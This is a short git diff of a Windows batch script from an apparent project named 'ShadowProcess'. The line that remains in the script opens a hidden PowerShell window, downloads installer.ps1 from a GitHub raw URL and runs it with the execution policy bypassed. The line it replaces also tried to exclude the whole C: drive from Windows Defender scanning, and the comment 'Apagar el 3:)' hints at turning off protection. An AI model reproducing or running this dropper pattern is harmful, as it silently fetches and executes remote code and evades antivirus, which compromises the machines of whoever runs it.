@@ -30,4 +30,4 @@ if '%errorlevel%' NEQ '0' (
 
 @REM Apagar el  3:)
 @REM obteniendo el installer 
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/tobiasasa/ShadowProcess/main/files/installer.ps1 -OutFile installer.ps1";powershell -executionpolicy bypass Add-MpPreference -ExclusionPatch set c:\;powershell -executionpolicy bypass -File ".\installer.ps1"
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/tobiasasa/ShadowProcess/main/files/installer.ps1 -OutFile installer.ps1";powershell -executionpolicy bypass -File ".\installer.ps1"
